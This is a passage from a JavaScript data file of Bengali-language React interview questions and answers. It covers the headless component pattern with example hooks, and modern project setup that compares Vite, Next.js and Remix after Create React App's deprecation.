      <p><strong>Headless Component Pattern</strong> মানে এমন কম্পোনেন্ট/hook লেখা যা সব <em>লজিক ও আচরণ</em> (state, keyboard nav, accessibility) সামলায়, কিন্তু <strong>কোনো স্টাইল বা মার্কআপ প্রদান করে না</strong> — সেই দায়িত্ব সম্পূর্ণভাবে ব্যবহারকারীর হাতে ছেড়ে দেয়।</p>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Headless hook — শুধু লজিক, কোনো JSX/স্টাইল নেই
function useToggle(initial = false) {
  const [isOn, setIsOn] = useState(initial);
  const toggle = useCallback(() => setIsOn(v => !v), []);
  return { isOn, toggle };
}

// ব্যবহারকারী নিজের মতো UI তৈরি করে
function ThemeSwitcher() {
  const { isOn, toggle } = useToggle();
  return (
    <button onClick={toggle} className="my-custom-switch">
      {isOn ? '🌙 ডার্ক' : '☀️ লাইট'}
    </button>
  );
}
// একই hook, সম্পূর্ণ ভিন্ন UI — কোনো CSS override দরকার নেই</code></pre>
      </div>
      <h4>কেন এই প্যাটার্ন — সমস্যাটি কী সমাধান করে</h4>
      <p>ঐতিহ্যবাহী কম্পোনেন্ট লাইব্রেরি (যেমন পুরনো Bootstrap-ভিত্তিক React লাইব্রেরি) নিজস্ব স্টাইল দিয়ে আসে — কাস্টমাইজ করতে হলে <code>!important</code> দিয়ে override করতে হয়, যা ভঙ্গুর ও রক্ষণাবেক্ষণ কঠিন। Headless কম্পোনেন্ট এই সমস্যা সমাধান করে <strong>লজিক ও প্রেজেন্টেশনকে সম্পূর্ণ আলাদা</strong> করে — জটিল আচরণ (keyboard navigation, focus trap, ARIA attribute) একবার সঠিকভাবে লেখা হয়, এবং যেকোনো ডিজাইন সিস্টেমের সাথে খাপ খাইয়ে নেওয়া যায়।</p>
      <h4>বাস্তব উদাহরণ — একটি Dropdown</h4>
      <div class="code-box">
        <div class="code-header"><span>jsx</span><button class="copy-btn">Copy</button></div>
        <pre><code>// Radix UI / Headless UI-এর মতো লাইব্রেরির ধারণা
function useDropdown() {
  const [isOpen, setIsOpen] = useState(false);
  const triggerRef = useRef(null);

  const open = () => setIsOpen(true);
  const close = () => setIsOpen(false);

  useEffect(() => {
    // keyboard nav, outside click, focus trap — সব লজিক এখানে
    function handleKey(e) { if (e.key === 'Escape') close(); }
    document.addEventListener('keydown', handleKey);
    return () => document.removeEventListener('keydown', handleKey);
  }, []);

  return { isOpen, open, close, triggerRef };
  // ARIA attribute (role, aria-expanded) সংযুক্ত করার দায়িত্বও এখানেই থাকতে পারে
}</code></pre>
      </div>
      <p>বাস্তব দুনিয়ায় <strong>Radix UI, Headless UI, React Aria</strong> এই প্যাটার্নে তৈরি — তারা সব অ্যাক্সেসিবিলিটি লজিক (keyboard trap, ARIA role, focus management — যা নিজে সঠিকভাবে লেখা কঠিন ও ভুলপ্রবণ) প্রদান করে, কিন্তু চূড়ান্ত ভিজ্যুয়াল ডিজাইন সম্পূর্ণ ডেভেলপারের হাতে ছেড়ে দেয় (সাধারণত Tailwind দিয়ে স্টাইল করা হয়)।</p>
      <h4>সুবিধা</h4>
      <ul>
        <li><strong>সম্পূর্ণ স্টাইলিং স্বাধীনতা</strong> — CSS override-এর যুদ্ধ ছাড়াই যেকোনো ডিজাইন প্রয়োগ করা যায়।</li>
        <li><strong>জটিল অ্যাক্সেসিবিলিটি লজিক পুনর্ব্যবহারযোগ্য</strong> — একবার সঠিকভাবে টেস্ট হলে বহু জায়গায় নিরাপদে ব্যবহার করা যায়।</li>
        <li><strong>টেস্ট করা সহজ</strong> — লজিক UI থেকে আলাদা থাকায় hook স্বতন্ত্রভাবে টেস্ট করা যায়।</li>
      </ul>
      <h4>ট্রেড-অফ</h4>
      <ul>
        <li>নিজে UI বানাতে হয় — কোনো রেডিমেড ভিজ্যুয়াল পাওয়া যায় না, ডেভেলপমেন্ট সময় বাড়ে।</li>
        <li>জটিল hook-এর API (render props, compound component pattern) মাঝে মাঝে শেখার বক্ররেখা তৈরি করে।</li>
      </ul>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Compound Component pattern-এর সাথে headless component-এর সম্পর্ক কী?</li>
        <li>Render props ও headless hook-এর মধ্যে পার্থক্য কী?</li>
      </ul>
    `
  },
  {
    id: "react-55",
    category: "React.js",
    difficulty: "Beginner",
    tags: ["Setup","Create React App","Vite"],
    question: "নতুন React প্রজেক্ট সেটআপ করার আধুনিক পদ্ধতি কী? CRA কি এখনও ব্যবহার করা উচিত?",
    answer: `
      <p>React প্রজেক্ট শুরু করার প্রেক্ষাপট গত কয়েক বছরে নাটকীয়ভাবে বদলেছে — <strong>Create React App (CRA) এখন আর React টিমের অফিসিয়াল সুপারিশ নয়</strong> এবং সক্রিয়ভাবে রক্ষণাবেক্ষণ করা হয় না।</p>
      <h4>CRA কেন বাদ পড়ল</h4>
      <ul>
        <li><strong>ধীর বিল্ড টুল:</strong> CRA Webpack ব্যবহার করে যা আধুনিক বিকল্পের (esbuild/Rollup-ভিত্তিক) তুলনায় অনেক ধীর, বিশেষত dev server স্টার্টআপ ও Hot Module Replacement-এ।</li>
        <li><strong>রক্ষণাবেক্ষণ বন্ধ:</strong> বছরের পর বছর কোনো বড় আপডেট নেই — dependency পুরনো হয়ে গেছে, নিরাপত্তা প্যাচ আসছে না।</li>
        <li><strong>কোনো SSR/RSC সাপোর্ট নেই:</strong> আধুনিক React ফিচার (Server Component, streaming) CRA-তে ব্যবহার করার কোনো পথ নেই।</li>
      </ul>
      <h4>আধুনিক বিকল্প</h4>
      <table>
        <tr><th>টুল</th><th>উপযুক্ত</th><th>বৈশিষ্ট্য</th></tr>
        <tr><td><strong>Vite</strong></td><td>SPA, লাইব্রেরি, দ্রুত প্রোটোটাইপ</td><td>esbuild-ভিত্তিক dev server (native ESM), তাৎক্ষণিক HMR</td></tr>
        <tr><td><strong>Next.js</strong></td><td>SSR/SSG দরকার এমন প্রোডাকশন অ্যাপ</td><td>App Router, Server Component, ফাইল-ভিত্তিক রাউটিং, বিল্ট-ইন অপ্টিমাইজেশন</td></tr>
        <tr><td><strong>Remix</strong></td><td>ফর্ম-heavy, ডেটা-লোডিং-কেন্দ্রিক অ্যাপ</td><td>নেস্টেড রাউটিং, progressive enhancement দর্শন</td></tr>
      </table>
      <h4>Vite দিয়ে শুরু করা</h4>
      <div class="code-box">
        <div class="code-header"><span>bash</span><button class="copy-btn">Copy</button></div>
        <pre><code>npm create vite@latest my-app -- --template react-ts
cd my-app && npm install && npm run dev
# dev server কয়েক মিলিসেকেন্ডে চালু হয় — CRA-তে সেকেন্ড লাগত</code></pre>
      </div>
      <p>Vite dev মোডে Webpack-এর মতো পুরো bundle তৈরি না করে ব্রাউজারের নেটিভ ES module সরাসরি সার্ভ করে — শুধু যে ফাইল দরকার সেটাই on-demand কম্পাইল হয়। এই কারণে বড় কোডবেসেও dev server স্টার্টআপ প্রায় তাৎক্ষণিক।</p>
      <h4>কখন কোনটি বেছে নেবেন</h4>
      <ul>
        <li><strong>SEO দরকার, বা প্রথম পেজ লোড দ্রুত হওয়া জরুরি</strong> (ই-কমার্স, ব্লগ, মার্কেটিং সাইট) → Next.js (SSR/SSG)।</li>
        <li><strong>Internal tool, dashboard, admin panel</strong> (SEO প্রয়োজন নেই, client-side রেন্ডার যথেষ্ট) → Vite + React Router।</li>
        <li><strong>একটি reusable কম্পোনেন্ট লাইব্রেরি তৈরি করছেন</strong> → Vite (library mode)।</li>
      </ul>
      <h4>আধুনিক প্রজেক্ট সেটআপের মূল উপাদান</h4>
      <ul>
        <li><strong>TypeScript ডিফল্ট</strong> — নতুন প্রজেক্টে প্রায় সবসময় প্রাধান্য পায়, টাইপ-সেফটি early bug catch করে।</li>
        <li><strong>ESLint + Prettier</strong> — কোড কনসিস্টেন্সি ও সাধারণ ভুল ধরার জন্য, pre-commit hook (husky) দিয়ে বলবৎ করা।</li>
        <li><strong>Vitest</strong> (Vite প্রজেক্টে) বা Jest — Vitest Vite-এর কনফিগ পুনর্ব্যবহার করে, দ্রুত এবং একই টুলচেইনের অংশ।</li>
        <li><strong>Path alias</strong> (<code>@/components/...</code>) — গভীর নেস্টেড relative import (<code>../../../</code>) এড়াতে।</li>
      </ul>
      <h4>Follow-up প্রশ্ন</h4>
      <ul>
        <li>Vite dev mode-এ native ESM ব্যবহার কীভাবে HMR দ্রুত করে?</li>
        <li>একটি existing CRA প্রজেক্ট Vite-এ মাইগ্রেট করার সময় কী কী সমস্যা হতে পারে?</li>
      </ul>
    `
  }
];
